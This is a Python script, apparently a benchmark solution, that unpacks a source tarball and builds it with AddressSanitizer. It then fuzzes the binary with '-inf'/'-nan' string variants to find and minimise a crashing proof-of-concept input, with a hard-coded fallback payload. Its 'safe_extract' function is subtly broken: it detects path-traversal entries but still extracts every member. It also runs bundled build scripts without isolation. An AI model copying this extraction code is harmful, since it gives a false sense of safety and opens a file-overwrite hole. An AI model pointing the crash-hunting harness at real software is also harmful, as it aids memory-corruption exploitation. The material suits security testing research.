import os
import tarfile
import tempfile
import subprocess
import shutil
import time


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            self._extract_tar(src_path, tmpdir)
            binary = self._build_target(tmpdir)
            if not binary:
                return self._fallback_poc()
            poc = self._find_poc(binary, tmpdir)
            if poc is None:
                return self._fallback_poc()
            # Optional quick minimization on trailing bytes
            mode = poc[1]
            data = poc[0]
            minimized = self._minimize(binary, tmpdir, data, mode, max_steps=64)
            return minimized
        finally:
            # Best-effort cleanup; ignore errors
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    def _extract_tar(self, src_path: str, out_dir: str) -> None:
        with tarfile.open(src_path, "r:*") as tf:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonprefix([abs_directory, abs_target])
                return prefix == abs_directory

            def safe_extract(tar, path=".", members=None):
                for member in tar.getmembers():
                    member_path = os.path.join(path, member.name)
                    if not is_within_directory(path, member_path):
                        continue
                tar.extractall(path, members)

            safe_extract(tf, out_dir)

    def _find_compiler(self, use_cpp: bool) -> str | None:
        candidates = ["clang++", "g++"] if use_cpp else ["clang", "gcc"]
        for c in candidates:
            path = shutil.which(c)
            if path:
                return path
        return None

    def _build_target(self, src_dir: str) -> str | None:
        # First, try to use build.sh or compile.sh if present
        build_script = None
        for root, _, files in os.walk(src_dir):
            for name in files:
                if name in ("build.sh", "compile.sh", "build.bash"):
                    build_script = os.path.join(root, name)
                    break
            if build_script:
                break
        if build_script:
            try:
                env = os.environ.copy()
                if "CC" not in env:
                    env["CC"] = self._find_compiler(False) or env.get("CC", "")
                if "CXX" not in env:
                    env["CXX"] = self._find_compiler(True) or env.get("CXX", "")
                subprocess.run(
                    ["bash", build_script],
                    cwd=os.path.dirname(build_script),
                    env=env,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=180,
                    check=True,
                )
                # After build, pick an executable file as target
                for root, _, files in os.walk(src_dir):
                    for f in files:
                        path = os.path.join(root, f)
                        if os.access(path, os.X_OK) and not os.path.isdir(path):
                            return path
            except Exception:
                pass

        # Fallback: try to compile all C/C++ files into a single binary
        c_files = []
        cpp_files = []
        for root, _, files in os.walk(src_dir):
            for f in files:
                if f.endswith(".c"):
                    c_files.append(os.path.join(root, f))
                elif f.endswith((".cc", ".cpp", ".cxx", ".C")):
                    cpp_files.append(os.path.join(root, f))
        if not c_files and not cpp_files:
            return None

        use_cpp = bool(cpp_files)
        compiler = self._find_compiler(use_cpp)
        if not compiler:
            return None

        sources = cpp_files + c_files if use_cpp else c_files
        binary = os.path.join(src_dir, "poc_target")
        cmd = [
            compiler,
            "-g",
            "-O1",
            "-fno-omit-frame-pointer",
            "-fsanitize=address",
        ]
        # UBSan is nice-to-have; ignore if not supported
        cmd += ["-fsanitize=undefined"]
        cmd += sources
        cmd += ["-lm", "-o", binary]
        try:
            subprocess.run(
                cmd,
                cwd=src_dir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=180,
                check=True,
            )
            if os.path.exists(binary):
                return binary
        except Exception:
            return None
        return None

    def _generate_candidates(self) -> list[bytes]:
        seeds = [
            "-inf",
            "-Inf",
            "-INF",
            "-infinity",
            "-Infinity",
            "-INFINITY",
            "-inff",
            "-inf0",
            "-in0",
            "-i",
            "-in",
            "-inx",
            "-ifn",
            "-iNf",
            "-nan",
            "-NaN",
            "-NAN",
            "-0inf",
            "--inf",
            "-infAAAAAAA",
            "-infinityBBBB",
        ]
        wrappers = [
            "%s",
            "%s\n",
            " %s ",
            "x=%s",
            "x=%s\n",
            "x = %s\n",
            "value=%s\n",
            "value: %s\n",
            "[%s]\n",
            "{ \"x\": %s }\n",
            "{\"x\":%s}\n",
            "---\nvalue: %s\n",
            "float(%s);\n",
            "(%s)\n",
        ]
        noises = ["", "AAAA", "0000", "ZZZZZZZZ"]
        candidates: list[bytes] = []
        for seed in seeds:
            for wrap in wrappers:
                base = wrap % seed
                for noise in noises:
                    s = base + noise
                    try:
                        candidates.append(s.encode("ascii"))
                    except Exception:
                        continue
        # Ensure some are not too long
        final = []
        for c in candidates:
            if len(c) > 1024:
                final.append(c[:1024])
            else:
                final.append(c)
        # Put some hand-crafted small candidates first
        prefix = [
            b"-inf",
            b"-Inf",
            b"-inff",
            b"-infx12345678\n",
            b"x=-inffooooooo\n",
            b"a=-inf12345678\n",
        ]
        return prefix + final

    def _detect_crash(self, result: subprocess.CompletedProcess) -> bool:
        if result.returncode < 0:
            return True
        stderr = b""
        try:
            stderr = result.stderr or b""
        except Exception:
            stderr = b""
        text = stderr.decode("latin1", "ignore")
        if "AddressSanitizer" in text:
            return True
        if "runtime error:" in text:
            return True
        if "stack-buffer-overflow" in text:
            return True
        if "heap-buffer-overflow" in text:
            return True
        return False

    def _run_mode(self, binary: str, mode: str, data: bytes, input_path: str) -> bool:
        try:
            if mode == "stdin":
                res = subprocess.run(
                    [binary],
                    input=data,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=0.5,
                )
                return self._detect_crash(res)
            elif mode == "file":
                with open(input_path, "wb") as f:
                    f.write(data)
                res = subprocess.run(
                    [binary, input_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=0.5,
                )
                return self._detect_crash(res)
            elif mode == "arg":
                try:
                    arg = data.decode("latin1", "ignore")
                except Exception:
                    return False
                res = subprocess.run(
                    [binary, arg],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=0.5,
                )
                return self._detect_crash(res)
        except (subprocess.TimeoutExpired, OSError):
            return False
        return False

    def _find_poc(self, binary: str, workdir: str) -> tuple[bytes, str] | None:
        candidates = self._generate_candidates()
        input_path = os.path.join(workdir, "input.bin")
        deadline = time.time() + 25.0
        for data in candidates:
            if time.time() > deadline:
                break
            for mode in ("stdin", "file", "arg"):
                if self._run_mode(binary, mode, data, input_path):
                    return data, mode
        return None

    def _minimize(
        self,
        binary: str,
        workdir: str,
        data: bytes,
        mode: str,
        max_steps: int = 64,
    ) -> bytes:
        input_path = os.path.join(workdir, "input_min.bin")
        curr = data
        steps = 0

        # Trim trailing whitespace/newlines first
        trimmed = curr.rstrip(b"\x00\r\n ")
        if trimmed and trimmed != curr:
            if self._run_mode(binary, mode, trimmed, input_path):
                curr = trimmed

        # Greedy truncate from the end
        while len(curr) > 1 and steps < max_steps:
            candidate = curr[:-1]
            steps += 1
            if not candidate:
                break
            if self._run_mode(binary, mode, candidate, input_path):
                curr = candidate
            else:
                break
        return curr

    def _fallback_poc(self) -> bytes:
        # 16-byte fallback incorporating leading minus and non-infinity token
        return b"x=-infx12345678\n"[:16]